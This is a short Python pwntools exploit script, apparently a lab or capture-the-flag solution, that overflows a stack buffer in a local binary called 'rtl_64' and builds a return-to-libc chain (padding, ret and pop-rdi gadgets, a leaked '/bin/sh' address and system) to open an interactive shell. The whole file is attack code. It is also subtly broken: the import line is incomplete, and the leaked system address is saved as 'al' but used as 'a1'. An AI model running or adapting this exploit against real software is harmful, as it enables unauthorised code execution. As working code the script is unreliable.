from pwn import

p = process("./rtl_64")

p.recvuntil("system : ")
al = int(p.recv(14), 16)
p.recvuntil("binsh : ")
a2 = int(p.recv(8), 16)

payload = b"A"*136
payload += p64(0x0000000000400551)
payload += p64(0x00000000004007a3)
payload += p64(a2)
payload += p64(a1)

pause()

p.sendline(payload)

p.interactive()
